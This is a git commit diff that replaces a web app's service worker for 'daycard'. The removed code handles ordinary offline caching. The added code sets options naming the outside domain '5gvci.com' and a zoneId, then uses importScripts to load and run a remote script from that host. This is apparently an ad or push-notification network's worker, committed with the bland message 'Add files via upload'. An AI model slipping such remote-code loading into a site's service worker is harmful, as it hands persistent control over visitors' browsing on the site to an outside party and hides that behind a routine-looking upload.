efef3341fd686675d8a98ea40b190b71f33e76c4
ivanovich1202-beep <ivanovich1202@gmail.com>
2026-05-29 10:14:07 -0600

    Add files via upload

--- sw.js
+++ sw.js
@@ -1,56 +1,6 @@
-const CACHE='daycard-v3';
-const STATIC=[
-  '/',
-  '/index.html',
-  '/subscribe.html',
-  '/manifest.json'
-];
-
-self.addEventListener('install',e=>{
-  e.waitUntil(
-    caches.open(CACHE).then(c=>c.addAll(STATIC)).then(()=>self.skipWaiting())
-  );
-});
-
-self.addEventListener('activate',e=>{
-  e.waitUntil(
-    caches.keys().then(keys=>Promise.all(
-      keys.filter(k=>k!==CACHE).map(k=>caches.delete(k))
-    )).then(()=>self.clients.claim())
-  );
-});
-
-self.addEventListener('fetch',e=>{
-  const url=new URL(e.request.url);
-
-  if(e.request.method!=='GET') return;
-
-  if(url.hostname.includes('openweathermap')||
-     url.hostname.includes('exchangerate-api')||
-     url.hostname.includes('allorigins')||
-     url.hostname.includes('ipapi')){
-    e.respondWith(
-      fetch(e.request)
-        .then(res=>{
-          const clone=res.clone();
-          caches.open(CACHE).then(c=>c.put(e.request,clone));
-          return res;
-        })
-        .catch(()=>caches.match(e.request))
-    );
-    return;
-  }
-
-  e.respondWith(
-    caches.match(e.request).then(cached=>{
-      if(cached) return cached;
-      return fetch(e.request).then(res=>{
-        if(res&&res.status===200){
-          const clone=res.clone();
-          caches.open(CACHE).then(c=>c.put(e.request,clone));
-        }
-        return res;
-      });
-    })
-  );
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 11074389
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
